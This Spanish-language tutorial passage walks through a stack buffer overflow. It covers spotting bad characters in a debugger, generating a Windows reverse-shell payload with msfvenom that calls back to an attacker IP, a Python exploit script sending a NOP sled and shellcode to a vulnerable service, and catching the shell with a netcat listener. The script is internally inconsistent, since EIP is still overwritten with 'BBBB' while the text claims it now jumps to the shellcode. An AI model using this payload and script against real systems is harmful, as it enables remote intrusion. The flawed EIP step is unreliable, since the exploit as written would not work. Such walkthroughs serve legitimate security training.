En **Immunity Debugger**, se puede seguir el puntero **ESP** para visualizar el volcado de memoria que contiene los caracteres enviados. Lo que se busca es identificar cualquier carácter faltante o fuera de lugar en la secuencia. Si, por ejemplo, la secuencia pasa de **0x03** a **0x05** sin incluir el **0x04**, entonces el **0x04** es un carácter malo que debe eliminarse del shellcode.

### Ejemplo de Identificación

En un escenario típico, si la secuencia de caracteres se ve así:

```
... 0x01 0x02 0x03 0x05 0x06 ...
```

Esto indica que el **0x04** es un carácter malo. Todos los caracteres faltantes o que no se encuentren en el orden correcto deben ser anotados y excluidos al generar el shellcode.

### Importancia de la Identificación Precisa

Es fundamental identificar correctamente todos los caracteres malos. Omitir un carácter malo puede llevar a que el shellcode no se ejecute correctamente, resultando en frustración y pérdida de tiempo al intentar diagnosticar el problema. Una vez que se tiene la lista completa de caracteres malos, se debe excluir cada uno de ellos al generar el shellcode.

### Próximos Pasos

Después de identificar todos los caracteres malos, el siguiente paso será **encontrar el módulo adecuado** en la memoria para la ejecución del shellcode y, posteriormente, generar el shellcode final para completar el ataque de desbordamiento de búfer.

Este proceso asegura que el shellcode se ejecute sin interrupciones ni errores causados por caracteres conflictivos.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">7. Generación de Shellcode.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

En esta etapa final, el objetivo es generar el **shellcode** necesario para obtener acceso remoto a la máquina objetivo. Para lograrlo, se utiliza la herramienta **MSFvenom**, que forma parte del framework **Metasploit**, y permite crear un shell inverso que será ejecutado en la máquina vulnerable.

### Utilización de MSFvenom

**MSFvenom** es una herramienta poderosa para generar payloads (cargas útiles) con diferentes opciones y configuraciones. En este caso, se generará un **shell inverso** que permita a la máquina víctima conectarse de vuelta a la máquina atacante.

### Comando para generar shellcode

El comando para generar el shellcode se compone de varios parámetros clave:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=4444 -f c -a x86 -b "\x00"
```

* **-p windows/shell_reverse_tcp**: Este es el payload que se usará, en este caso, un shell inverso para sistemas Windows que utiliza el protocolo TCP.
* **LHOST=IP_ATACANTE**: Aquí se debe especificar la dirección IP de la máquina atacante, es decir, la máquina desde la cual se controlará el ataque.
* **LPORT=4444**: El puerto en el que se escuchará la conexión desde la máquina víctima. En este ejemplo se usa el puerto 4444, pero puede ser cualquier puerto abierto en la máquina atacante.
* **-f c**: Este parámetro indica que el formato de salida del shellcode será en lenguaje C, para facilitar su inclusión en el script de Python.
* **-a x86**: Se especifica que el shellcode debe ser compatible con una arquitectura x86.
* **-b "\x00"**: La opción -b permite excluir ciertos caracteres del shellcode. En este caso, se excluye el byte nulo (\x00), ya que este puede causar problemas en la ejecución.

### Ejecución de MSFvenom

Al ejecutar el comando anterior, MSFvenom generará el shellcode, que será una cadena de bytes en formato hexadecimal. Un ejemplo del resultado sería algo similar a lo siguiente:

```c
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52..."
```

Este código es la carga útil que se inyectará en la máquina víctima.

### Inclusión del Shellcode en el Script

Una vez generado el shellcode, se debe incluir en el script de Python que se ha estado utilizando. Para ello, se define una variable que contenga el shellcode y se añade al flujo del ataque.

```python
#!/usr/bin/python
import sys, socket

# Shellcode generado por MSFvenom
shellcode = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52..."
)

buffer = "A" * 2003 + "B" * 4 + "\x90" * 32 + shellcode  # Añadimos un NOP sled de 32 bytes

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('IP_DEL_SERVIDOR', 9999))
    s.send(('TRUN /.:/' + buffer))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

### Explicación del Script

* **NOP Sled (\x90)**: Se ha añadido un NOP sled de 32 bytes. El código 0x90 es la instrucción NOP (No Operation), que simplemente crea un "colchón" en el que el shellcode puede caer de manera segura y ejecutarse sin interrupciones.
* **Sobrescribir el EIP**: El EIP sigue sobrescrito con el valor 0x42424242 (representado por las letras "B"), pero esta vez se apunta a una dirección en la memoria que ejecutará el shellcode.
* **Shellcode**: El shellcode generado por MSFvenom se inserta al final del buffer, después del NOP sled, listo para ser ejecutado cuando se tome el control del flujo del programa.

### Configuración de Netcat para Escuchar la Conexión

Antes de ejecutar el script, se debe configurar Netcat en la máquina atacante para que escuche en el puerto designado (4444 en este caso):

```bash
nc -lvnp 4444
```

Esto permitirá capturar la conexión inversa desde la máquina víctima.

### Ejecución del Ataque

Con el servidor vulnerable ejecutándose en la máquina víctima, se lanza el script Python que contiene el shellcode:

```bash
python exploit.py
```

Una vez ejecutado, si todo ha sido configurado correctamente, la máquina víctima se conectará a la máquina atacante, y se obtendrá una shell remota en Netcat.

### Verificación del Acceso

Una vez que se ha obtenido la shell, se pueden ejecutar comandos en la máquina comprometida. Por ejemplo, para verificar el acceso:

```bash
whoami
```

Esto debería devolver el nombre del usuario que ejecuta el servidor vulnerable, confirmando que el atacante ha obtenido acceso al sistema.

### Próximos Pasos

A partir de aquí, el atacante tiene acceso total a la máquina víctima y puede realizar cualquier operación que desee. Sin embargo, en entornos más protegidos, se necesitaría implementar técnicas adicionales para evadir sistemas de detección y mantener el acceso.

## 8. TAREA

- Pending ... 